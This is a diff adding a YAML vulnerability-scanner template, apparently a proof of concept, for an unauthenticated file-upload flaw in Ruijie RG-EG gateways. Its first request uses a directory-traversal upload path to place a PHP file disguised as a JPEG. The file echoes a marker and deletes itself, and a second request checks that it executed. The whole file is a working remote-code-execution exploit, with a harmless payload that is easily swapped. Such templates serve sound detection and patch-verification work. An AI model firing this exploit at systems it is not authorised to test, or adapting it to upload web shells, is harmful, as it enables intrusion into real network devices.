@@ -1,0 +1,32 @@
+name: yaml-poc-ruijie-rg_eg-file_upload-CT-529878
+binding: 1a7ecedd-c0df-46eb-82e1-1e0b7278bb97
+detail:
+    author: 2husky
+    vulnerability:
+        id: f7763f93-6012-4d79-a9ab-4f2c534245f3
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    s1: randomLowercase(8)
+    s2: randomLowercase(8)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /ddi/server/fileupload.php?uploadDir=../../&name={{s2}}.php
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{s2}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo \"{{s1}}\"; unlink(__FILE__); ?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /{{s2}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(s1)
+expression: r0() && r1()
